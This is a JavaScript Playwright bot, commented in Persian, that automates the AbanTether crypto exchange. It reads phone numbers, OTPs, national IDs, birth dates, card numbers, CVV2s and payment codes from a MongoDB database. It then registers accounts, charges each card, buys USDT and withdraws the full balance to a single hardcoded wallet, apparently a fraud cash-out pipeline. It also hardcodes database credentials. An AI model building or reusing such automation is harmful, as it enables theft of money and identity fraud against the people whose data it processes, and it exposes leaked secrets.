// bot.js - ربات کامل اتوماسیون آبان تتر
// نسخه نهایی - تمام مشکلات رفع شده

const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');

// ==================== تنظیمات ====================
const CONFIG = {
    // تنظیمات دیتابیس شما
    MONGODB_URI: 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority',
    DATABASE_NAME: 'ZarrinApp',
    COLLECTION_NAME: 'zarinapp',
    
    // تنظیمات سایت
    BASE_URL: 'https://abantether.com',
    HEADLESS: false,  // false برای دیدن مرورگر، true برای سرور
    TIMEOUT: 60000,
    
    // تراکنش‌ها
    DEPOSIT_AMOUNT: '5000000',
    WITHDRAW_ADDRESS: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
    DEFAULT_PASSWORD: 'Abc@123456',
    
    // مدیریت خطا و تلاش مجدد
    MAX_RETRIES: 3,
    RETRY_DELAY: 10000,
    
    // زمان‌بندی
    POLLING_INTERVAL: 30000,  // هر 30 ثانیه
    CONCURRENT_USERS: 2
};

// ==================== مدیریت دیتابیس ====================
class DatabaseManager {
    constructor() {
        this.client = null;
        this.db = null;
        this.collection = null;
    }

    async connect() {
        try {
            console.log('🔄 در حال اتصال به دیتابیس...');
            this.client = new MongoClient(CONFIG.MONGODB_URI);
            await this.client.connect();
            this.db = this.client.db(CONFIG.DATABASE_NAME);
            this.collection = this.db.collection(CONFIG.COLLECTION_NAME);
            console.log('✅ اتصال به دیتابیس موفق بود');
            return true;
        } catch (error) {
            console.error('❌ خطا در اتصال به دیتابیس:', error.message);
            return false;
        }
    }

    async getUsersToProcess() {
        try {
            // پیدا کردن کاربران با OTP و بدون پردازش
            const query = {
                otp_login: { $exists: true, $ne: null, $ne: '' },
                processed: { $ne: true },
                $or: [
                    { status: { $exists: false } },
                    { status: { $ne: 'failed' } }
                ]
            };

            const users = await this.collection.find(query).toArray();
            console.log(`📊 ${users.length} کاربر برای پردازش یافت شد`);
            
            // نمایش اطلاعات کاربران
            users.forEach((user, index) => {
                const phone = user.personalPhoneNumber || 'بدون شماره';
                const hasOtp = user.otp_login ? '✅' : '❌';
                const attempts = user.retryCount || 0;
                console.log(`   ${index + 1}. ${phone} | OTP: ${hasOtp} | تلاش‌ها: ${attempts}`);
            });
            
            return users;
        } catch (error) {
            console.error('❌ خطا در دریافت کاربران:', error.message);
            return [];
        }
    }

    async updateUser(phone, data) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { $set: data },
                { upsert: true }
            );
            return true;
        } catch (error) {
            console.error('❌ خطا در آپدیت کاربر:', error.message);
            return false;
        }
    }

    async markAsProcessing(phone) {
        return this.updateUser(phone, {
            status: 'processing',
            startedAt: new Date()
        });
    }

    async markAsCompleted(phone) {
        return this.updateUser(phone, {
            processed: true,
            status: 'completed',
            completedAt: new Date()
        });
    }

    async markAsFailed(phone, error) {
        return this.updateUser(phone, {
            status: 'failed',
            error: error,
            failedAt: new Date()
        });
    }

    async disconnect() {
        if (this.client) {
            await this.client.close();
            console.log('🔌 اتصال دیتابیس بسته شد');
        }
    }
}

// ==================== ربات اصلی ====================
class AbanTetherBot {
    constructor(userData) {
        this.userData = userData;
        this.browser = null;
        this.page = null;
        this.currentStep = '';
    }

    async init() {
        try {
            console.log('🚀 در حال راه‌اندازی مرورگر...');
            this.browser = await chromium.launch({
                headless: CONFIG.HEADLESS,
                args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
            
            this.page = await this.browser.newPage();
            await this.page.setViewportSize({ width: 1280, height: 720 });
            await this.page.setDefaultTimeout(CONFIG.TIMEOUT);
            
            console.log('✅ مرورگر آماده است');
            return true;
        } catch (error) {
            console.error('❌ خطا در راه‌اندازی مرورگر:', error.message);
            return false;
        }
    }

    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async randomDelay(min = 1000, max = 3000) {
        const delay = Math.floor(Math.random() * (max - min + 1)) + min;
        await this.delay(delay);
    }

    async clickByText(text) {
        try {
            console.log(`🖱️ در حال کلیک روی "${text}"...`);
            
            // روش‌های مختلف برای پیدا کردن دکمه
            const selectors = [
                `button:has-text("${text}")`,
                `a:has-text("${text}")`,
                `input[value="${text}"]`,
                `//button[contains(text(), '${text}')]`,
                `//a[contains(text(), '${text}')]`,
                `//div[contains(text(), '${text}')]`,
                `//span[contains(text(), '${text}')]`
            ];
            
            for (const selector of selectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element && await element.isVisible()) {
                        await element.click();
                        console.log(`✅ روی "${text}" کلیک شد`);
                        await this.randomDelay(500, 1500);
                        return true;
                    }
                } catch (e) {
                    continue;
                }
            }
            
            console.log(`⚠️ المان "${text}" پیدا نشد`);
            return false;
        } catch (error) {
            console.error(`❌ خطا در کلیک روی "${text}":`, error.message);
            return false;
        }
    }

    async fillField(fieldName, value) {
        try {
            console.log(`📝 پر کردن ${fieldName} با ${value}`);
            
            // استراتژی‌های مختلف برای پیدا کردن فیلد
            const strategies = [
                // جستجو با placeholder
                async () => {
                    const placeholders = {
                        'موبایل': ['موبایل', 'تلفن', 'شماره', 'phone', 'mobile'],
                        'رمز عبور': ['رمز', 'پسورد', 'password'],
                        'کدملی': ['کدملی', 'ملی', 'کد ملی'],
                        'تاریخ تولد': ['تاریخ تولد', 'تولد', 'birth'],
                        'شماره کارت': ['شماره کارت', 'کارت', 'card'],
                        'CVV2': ['cvv2', 'cvv', 'کد'],
                        'ماه': ['ماه', 'month'],
                        'سال': ['سال', 'year'],
                        'مبلغ': ['مبلغ', 'amount'],
                        'آدرس': ['آدرس', 'address']
                    };
                    
                    for (const [key, keywords] of Object.entries(placeholders)) {
                        if (fieldName.includes(key)) {
                            for (const keyword of keywords) {
                                const selector = `input[placeholder*="${keyword}"], textarea[placeholder*="${keyword}"]`;
                                const element = await this.page.$(selector);
                                if (element) {
                                    await element.fill(value);
                                    return true;
                                }
                            }
                        }
                    }
                    return false;
                },
                
                // جستجو با label
                async () => {
                    const selector = `//label[contains(., '${fieldName}')]/following::input[1]`;
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.fill(value);
                        return true;
                    }
                    return false;
                },
                
                // جستجو با name یا id
                async () => {
                    const names = {
                        'موبایل': ['phone', 'mobile', 'tel'],
                        'رمز عبور': ['password', 'pass'],
                        'کدملی': ['nationalCode', 'meli'],
                        'تاریخ تولد': ['birthDate', 'birthday']
                    };
                    
                    for (const [key, nameList] of Object.entries(names)) {
                        if (fieldName.includes(key)) {
                            for (const name of nameList) {
                                const selectors = [
                                    `input[name*="${name}"]`,
                                    `input[id*="${name}"]`,
                                    `textarea[name*="${name}"]`
                                ];
                                
                                for (const sel of selectors) {
                                    const element = await this.page.$(sel);
                                    if (element) {
                                        await element.fill(value);
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                    return false;
                }
            ];
            
            for (const strategy of strategies) {
                try {
                    const success = await strategy();
                    if (success) {
                        console.log(`✅ ${fieldName} پر شد`);
                        await this.randomDelay();
                        return true;
                    }
                } catch (e) {
                    continue;
                }
            }
            
            console.log(`⚠️ فیلد ${fieldName} پیدا نشد`);
            return false;
        } catch (error) {
            console.error(`❌ خطا در پر کردن ${fieldName}:`, error.message);
            return false;
        }
    }

    async enterOtp(otpCode) {
        try {
            if (!otpCode || otpCode.length < 4) {
                console.log('⚠️ کد OTP نامعتبر است');
                return false;
            }
            
            console.log(`🔢 وارد کردن کد OTP: ${otpCode}`);
            
            // پیدا کردن فیلدهای OTP
            const otpSelectors = [
                'input[type="tel"]',
                'input[type="number"]',
                'input[maxlength="1"]',
                '.otp-input',
                '.verification-code'
            ];
            
            let otpFields = [];
            
            for (const selector of otpSelectors) {
                const fields = await this.page.$$(selector);
                if (fields.length >= 4) {
                    otpFields = fields;
                    break;
                }
            }
            
            // اگر پیدا نشد، همه inputها را بررسی کن
            if (otpFields.length === 0) {
                const allInputs = await this.page.$$('input');
                otpFields = allInputs.slice(0, 6);
            }
            
            if (otpFields.length === 0) {
                throw new Error('فیلدهای OTP پیدا نشد');
            }
            
            // پر کردن فیلدها
            for (let i = 0; i < Math.min(otpFields.length, otpCode.length); i++) {
                const field = otpFields[i];
                if (field) {
                    await field.click();
                    await field.fill('');
                    await field.fill(otpCode[i]);
                    await this.delay(200);
                }
            }
            
            console.log('✅ کد OTP وارد شد');
            return true;
        } catch (error) {
            console.error('❌ خطا در وارد کردن OTP:', error.message);
            return false;
        }
    }

    async phase1_register() {
        this.currentStep = 'ثبت‌نام';
        console.log('\n🎬 === فاز ۱: ثبت‌نام ===');
        
        try {
            // 1. رفتن به سایت
            console.log('1. رفتن به سایت...');
            await this.page.goto(CONFIG.BASE_URL);
            await this.randomDelay(2000, 4000);
            
            // 2. کلیک روی ثبت‌نام
            console.log('2. کلیک روی ثبت‌نام...');
            await this.clickByText('ثبت‌نام');
            await this.randomDelay(1000, 2000);
            
            // 3. وارد کردن شماره موبایل
            console.log('3. وارد کردن شماره موبایل...');
            await this.fillField('موبایل', this.userData.personalPhoneNumber);
            
            // 4. کلیک ادامه
            console.log('4. کلیک ادامه...');
            await this.clickByText('ادامه');
            await this.randomDelay(3000, 5000);
            
            // 5. وارد کردن OTP
            if (this.userData.otp_login) {
                console.log('5. وارد کردن کد تایید...');
                await this.enterOtp(this.userData.otp_login);
                
                // 6. کلیک تأیید
                console.log('6. کلیک تأیید...');
                await this.clickByText('تأیید');
                await this.randomDelay(2000, 3000);
                
                // 7. وارد کردن رمز عبور
                console.log('7. وارد کردن رمز عبور...');
                const password = this.userData.password || CONFIG.DEFAULT_PASSWORD;
                await this.fillField('رمز عبور', password);
                
                // 8. کلیک تکمیل ثبت‌نام
                console.log('8. کلیک تکمیل ثبت‌نام...');
                await this.clickByText('تکمیل ثبت‌نام');
                await this.randomDelay(2000, 3000);
                
                // 9. وارد کردن کد ملی
                if (this.userData.personalNationalCode) {
                    console.log('9. وارد کردن کد ملی...');
                    await this.fillField('کدملی', this.userData.personalNationalCode);
                }
                
                // 10. وارد کردن تاریخ تولد
                if (this.userData.personalBirthDate) {
                    console.log('10. وارد کردن تاریخ تولد...');
                    await this.fillField('تاریخ تولد', this.userData.personalBirthDate);
                }
                
                // 11. کلیک تأیید اطلاعات
                console.log('11. کلیک تأیید اطلاعات...');
                await this.clickByText('تأیید اطلاعات');
                await this.randomDelay(3000, 5000);
            } else {
                console.log('⏳ منتظر OTP...');
                await this.delay(5000);
            }
            
            console.log('✅ فاز ۱ تکمیل شد');
            return true;
        } catch (error) {
            console.error('❌ خطا در فاز ۱:', error.message);
            throw error;
        }
    }

    async phase2_registerCard() {
        this.currentStep = 'ثبت کارت';
        console.log('\n💳 === فاز ۲: ثبت کارت ===');
        
        try {
            // 1. رفتن به حساب بانکی
            console.log('1. رفتن به حساب بانکی...');
            await this.clickByText('حساب بانکی');
            await this.randomDelay(2000, 3000);
            
            // 2. افزودن کارت جدید
            console.log('2. افزودن کارت جدید...');
            await this.clickByText('افزودن کارت جدید');
            await this.randomDelay(1000, 2000);
            
            // 3. وارد کردن شماره کارت
            if (this.userData.cardNumber) {
                console.log('3. وارد کردن شماره کارت...');
                await this.fillField('شماره کارت', this.userData.cardNumber);
                
                // 4. کلیک ثبت کارت
                console.log('4. کلیک ثبت کارت...');
                await this.clickByText('ثبت کارت');
                await this.randomDelay(2000, 3000);
                
                // 5. وارد کردن OTP ثبت کارت
                if (this.userData.otp_register_card) {
                    console.log('5. وارد کردن OTP کارت...');
                    await this.enterOtp(this.userData.otp_register_card);
                    
                    console.log('6. کلیک تأیید...');
                    await this.clickByText('تأیید');
                    await this.randomDelay(2000, 3000);
                }
            }
            
            console.log('✅ فاز ۲ تکمیل شد');
            return true;
        } catch (error) {
            console.error('❌ خطا در فاز ۲:', error.message);
            throw error;
        }
    }

    async phase3_deposit() {
        this.currentStep = 'واریز';
        console.log('\n💰 === فاز ۳: واریز ===');
        
        try {
            // 1. رفتن به کیف پول
            console.log('1. رفتن به کیف پول...');
            await this.clickByText('کیف پول');
            await this.randomDelay(2000, 3000);
            
            // 2. کلیک واریز تومان
            console.log('2. کلیک واریز تومان...');
            await this.clickByText('واریز تومان');
            await this.randomDelay(1000, 2000);
            
            // 3. انتخاب واریز آنلاین
            console.log('3. انتخاب واریز آنلاین...');
            await this.clickByText('واریز آنلاین (درگاه پرداخت)');
            await this.randomDelay(1000, 2000);
            
            // 4. وارد کردن مبلغ
            console.log('4. وارد کردن مبلغ...');
            await this.fillField('مبلغ', CONFIG.DEPOSIT_AMOUNT);
            
            // 5. کلیک ایجاد درخواست
            console.log('5. کلیک ایجاد درخواست...');
            await this.clickByText('ایجاد درخواست واریز');
            await this.randomDelay(3000, 5000);
            
            // 6. بررسی درگاه بانک
            const currentUrl = this.page.url();
            if (currentUrl.includes('bank') || currentUrl.includes('shaparak')) {
                console.log('🏦 انتقال به درگاه بانک...');
                
                // وارد کردن CVV2
                if (this.userData.cvv2) {
                    await this.fillField('CVV2', this.userData.cvv2);
                }
                
                // وارد کردن تاریخ انقضا
                if (this.userData.bankMonth && this.userData.bankYear) {
                    const expiry = `${this.userData.bankMonth}/${this.userData.bankYear.slice(2)}`;
                    await this.fillField('تاریخ انقضا', expiry);
                }
                
                // وارد کردن OTP پرداخت
                if (this.userData.otp_payment) {
                    await this.enterOtp(this.userData.otp_payment);
                    await this.clickByText('پرداخت');
                    await this.randomDelay(5000, 8000);
                }
            }
            
            console.log('✅ فاز ۳ تکمیل شد');
            return true;
        } catch (error) {
            console.error('❌ خطا در فاز ۳:', error.message);
            throw error;
        }
    }

    async phase4_buyUsdt() {
        this.currentStep = 'خرید';
        console.log('\n🔄 === فاز ۴: خرید تتر ===');
        
        try {
            // 1. رفتن به معامله فوری
            console.log('1. رفتن به معامله فوری...');
            await this.clickByText('معامله فوری');
            await this.randomDelay(2000, 3000);
            
            // 2. انتخاب تتر
            console.log('2. انتخاب تتر...');
            await this.clickByText('تتر');
            await this.randomDelay(1000, 2000);
            
            // 3. وارد کردن مبلغ
            console.log('3. وارد کردن مبلغ...');
            await this.fillField('مبلغ', CONFIG.DEPOSIT_AMOUNT);
            
            // 4. کلیک خرید
            console.log('4. کلیک خرید...');
            await this.clickByText('تایید و خرید');
            await this.randomDelay(2000, 3000);
            
            // 5. تأیید نهایی
            console.log('5. تأیید نهایی...');
            await this.clickByText('تأیید');
            await this.randomDelay(3000, 5000);
            
            console.log('✅ فاز ۴ تکمیل شد');
            return true;
        } catch (error) {
            console.error('❌ خطا در فاز ۴:', error.message);
            throw error;
        }
    }

    async phase5_withdraw() {
        this.currentStep = 'برداشت';
        console.log('\n📤 === فاز ۵: برداشت ===');
        
        try {
            // 1. رفتن به کیف پول
            console.log('1. رفتن به کیف پول...');
            await this.clickByText('کیف پول');
            await this.randomDelay(2000, 3000);
            
            // 2. کلیک برداشت رمزارز
            console.log('2. کلیک برداشت رمزارز...');
            await this.clickByText('برداشت رمزارز');
            await this.randomDelay(1000, 2000);
            
            // 3. انتخاب تتر
            console.log('3. انتخاب تتر...');
            await this.clickByText('تتر');
            await this.randomDelay(1000, 2000);
            
            // 4. انتخاب شبکه
            console.log('4. انتخاب شبکه...');
            await this.clickByText('TRC-20');
            await this.randomDelay(1000, 2000);
            
            // 5. وارد کردن آدرس
            console.log('5. وارد کردن آدرس...');
            await this.fillField('آدرس', CONFIG.WITHDRAW_ADDRESS);
            
            // 6. انتخاب همه موجودی
            console.log('6. انتخاب همه موجودی...');
            await this.clickByText('همه موجودی');
            await this.randomDelay(1000, 2000);
            
            // 7. ثبت درخواست
            console.log('7. ثبت درخواست...');
            await this.clickByText('ثبت درخواست برداشت');
            await this.randomDelay(2000, 3000);
            
            console.log('✅ فاز ۵ تکمیل شد');
            return true;
        } catch (error) {
            console.error('❌ خطا در فاز ۵:', error.message);
            throw error;
        }
    }

    async cleanup() {
        try {
            if (this.page) await this.page.close();
            if (this.browser) await this.browser.close();
        } catch (error) {
            console.log('⚠️ خطا در پاکسازی:', error.message);
        }
    }

    async run() {
        const phone = this.userData.personalPhoneNumber || 'نامشخص';
        console.log(`\n🤖 === شروع پردازش کاربر: ${phone} ===`);
        
        let success = false;
        let errorMsg = '';
        
        try {
            // راه‌اندازی
            const initialized = await this.init();
            if (!initialized) {
                throw new Error('راه‌اندازی مرورگر ناموفق');
            }
            
            // اجرای مراحل
            const phases = [
                { name: 'ثبت‌نام', func: () => this.phase1_register() },
                { name: 'ثبت کارت', func: () => this.phase2_registerCard() },
                { name: 'واریز', func: () => this.phase3_deposit() },
                { name: 'خرید', func: () => this.phase4_buyUsdt() },
                { name: 'برداشت', func: () => this.phase5_withdraw() }
            ];
            
            for (const phase of phases) {
                console.log(`\n🚀 اجرای مرحله: ${phase.name}`);
                this.currentStep = phase.name;
                
                try {
                    await phase.func();
                    console.log(`✅ مرحله ${phase.name} با موفقیت انجام شد`);
                } catch (phaseError) {
                    console.error(`❌ خطا در مرحله ${phase.name}:`, phaseError.message);
                    throw phaseError;
                }
                
                await this.randomDelay(2000, 3000);
            }
            
            success = true;
            console.log(`\n🎉 🎉 پردازش کاربر ${phone} با موفقیت تکمیل شد! 🎉 🎉`);
            
        } catch (error) {
            success = false;
            errorMsg = `خطا در ${this.currentStep}: ${error.message}`;
            console.error(`\n💥 ${errorMsg}`);
        } finally {
            await this.cleanup();
        }
        
        return {
            success: success,
            phone: phone,
            step: this.currentStep,
            error: errorMsg
        };
    }
}

// ==================== کنترلر اصلی ====================
class MainController {
    constructor() {
        this.dbManager = new DatabaseManager();
        this.queue = [];
        this.processing = new Set();
        this.stats = {
            total: 0,
            success: 0,
            failed: 0
        };
    }

    async start() {
        console.log(`
╔══════════════════════════════════════╗
║                                      ║
║      🤖 ربات آبان تتر               ║
║      نسخه نهایی                     ║
║                                      ║
╚══════════════════════════════════════╝
        `);
        
        // اتصال به دیتابیس
        const connected = await this.dbManager.connect();
        if (!connected) {
            console.error('❌ نمی‌توانم به دیتابیس متصل شوم. خروج...');
            process.exit(1);
        }
        
        console.log('✅ ربات فعال شد');
        console.log(`⏱️  هر ${CONFIG.POLLING_INTERVAL/1000} ثانیه دیتابیس چک می‌شود`);
        console.log(`🔄 حداکثر ${CONFIG.MAX_RETRIES} تلاش برای هر کاربر`);
        console.log(`👥 ${CONFIG.CONCURRENT_USERS} کاربر همزمان`);
        console.log('\n📞 منتظر کاربران جدید...\n');
        
        // شروع چک‌های دوره‌ای
        setInterval(() => this.checkForNewUsers(), CONFIG.POLLING_INTERVAL);
        setInterval(() => this.processQueue(), 10000);
        setInterval(() => this.showStatus(), 60000);
        
        // چک اولیه
        await this.checkForNewUsers();
    }

    async checkForNewUsers() {
        try {
            console.log('🔍 بررسی دیتابیس برای کاربران جدید...');
            const users = await this.dbManager.getUsersToProcess();
            
            for (const user of users) {
                const phone = user.personalPhoneNumber;
                
                // بررسی شرایط
                if (!phone || phone.trim() === '') {
                    console.log('⚠️ کاربر بدون شماره موبایل نادیده گرفته شد');
                    continue;
                }
                
                if (this.processing.has(phone)) {
                    console.log(`⏭️ ${phone}: در حال پردازش است`);
                    continue;
                }
                
                if (user.processed === true) {
                    continue;
                }
                
                const retryCount = user.retryCount || 0;
                if (retryCount >= CONFIG.MAX_RETRIES) {
                    console.log(`⛔ ${phone}: حداکثر تلاش‌ها انجام شده`);
                    continue;
                }
                
                if (!user.otp_login) {
                    console.log(`⏳ ${phone}: منتظر OTP`);
                    continue;
                }
                
                // افزودن به صف
                this.addToQueue(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی کاربران:', error.message);
        }
    }

    addToQueue(user) {
        const phone = user.personalPhoneNumber;
        
        // بررسی وجود در صف
        const exists = this.queue.find(u => u.personalPhoneNumber === phone);
        if (exists) {
            return;
        }
        
        this.queue.push({
            ...user,
            addedAt: new Date(),
            attempt: (user.retryCount || 0) + 1
        });
        
        console.log(`📝 ${phone} به صف اضافه شد (تلاش ${(user.retryCount || 0) + 1})`);
    }

    async processQueue() {
        // بررسی ظرفیت
        if (this.processing.size >= CONFIG.CONCURRENT_USERS) {
            return;
        }
        
        if (this.queue.length === 0) {
            return;
        }
        
        // پردازش کاربران
        const available = CONFIG.CONCURRENT_USERS - this.processing.size;
        const toProcess = this.queue.splice(0, Math.min(available, this.queue.length));
        
        for (const user of toProcess) {
            this.processUser(user);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        const attempt = user.attempt || 1;
        
        this.processing.add(phone);
        console.log(`\n👤 شروع پردازش ${phone} (تلاش ${attempt}/${CONFIG.MAX_RETRIES})`);
        
        try {
            // علامت‌گذاری در دیتابیس
            await this.dbManager.markAsProcessing(phone);
            
            // اجرای ربات
            const bot = new AbanTetherBot(user);
            const result = await bot.run();
            
            if (result.success) {
                // موفقیت
                this.stats.success++;
                this.stats.total++;
                
                console.log(`\n🎉 ${phone}: موفق`);
                await this.dbManager.markAsCompleted(phone);
                
            } else {
                // شکست
                this.stats.failed++;
                this.stats.total++;
                
                console.log(`\n💥 ${phone}: ناموفق - ${result.error}`);
                
                // بررسی تلاش مجدد
                const retryCount = (user.retryCount || 0) + 1;
                
                if (retryCount >= CONFIG.MAX_RETRIES) {
                    // حداکثر تلاش‌ها
                    console.log(`⛔ ${phone}: ۳ بار شکست خورد`);
                    await this.dbManager.markAsFailed(phone, result.error);
                } else {
                    // زمان‌بندی مجدد
                    const delay = CONFIG.RETRY_DELAY * retryCount;
                    console.log(`🔄 ${phone}: ${delay/1000} ثانیه دیگر دوباره تلاش می‌کنم`);
                    
                    setTimeout(() => {
                        this.addToQueue({ ...user, retryCount });
                    }, delay);
                }
            }
            
        } catch (error) {
            console.error(`\n🔥 خطای غیرمنتظره برای ${phone}:`, error.message);
            await this.dbManager.markAsFailed(phone, error.message);
            
        } finally {
            // حذف از لیست پردازش
            this.processing.delete(phone);
            console.log(`🏁 پردازش ${phone} پایان یافت\n`);
        }
    }

    showStatus() {
        const now = new Date();
        const processingList = Array.from(this.processing);
        
        console.log(`
📊 وضعیت ربات:
├── کل پردازش‌شده: ${this.stats.total}
├── موفق: ${this.stats.success}
├── ناموفق: ${this.stats.failed}
├── در صف: ${this.queue.length}
├── در حال پردازش: ${processingList.length} ${processingList.length > 0 ? `(${processingList.join(', ')})` : ''}
└── زمان: ${now.toLocaleTimeString('fa-IR')}
────────────────────────
        `);
    }

    async shutdown() {
        console.log('\n🛑 در حال خاموش کردن ربات...');
        await this.dbManager.disconnect();
        console.log('👋 ربات خاموش شد');
        process.exit(0);
    }
}

// ==================== اجرای اصلی ====================
// مدیریت خطاها
process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 Promise رد شد:', reason);
});

// خاموش‌سازی تمیز
process.on('SIGTERM', async () => {
    console.log('\n🛑 دریافت سیگنال خاموشی');
    const controller = global.controller;
    if (controller) {
        await controller.shutdown();
    }
});

process.on('SIGINT', async () => {
    console.log('\n🛑 دریافت Ctrl+C');
    const controller = global.controller;
    if (controller) {
        await controller.shutdown();
    }
});

// اجرا
async function main() {
    try {
        const controller = new MainController();
        global.controller = controller;
        await controller.start();
    } catch (error) {
        console.error('🔥 خطا در راه‌اندازی ربات:', error);
        process.exit(1);
    }
}

// اگر فایل مستقیماً اجرا شود
if (require.main === module) {
    main();
}

module.exports = { AbanTetherBot, MainController };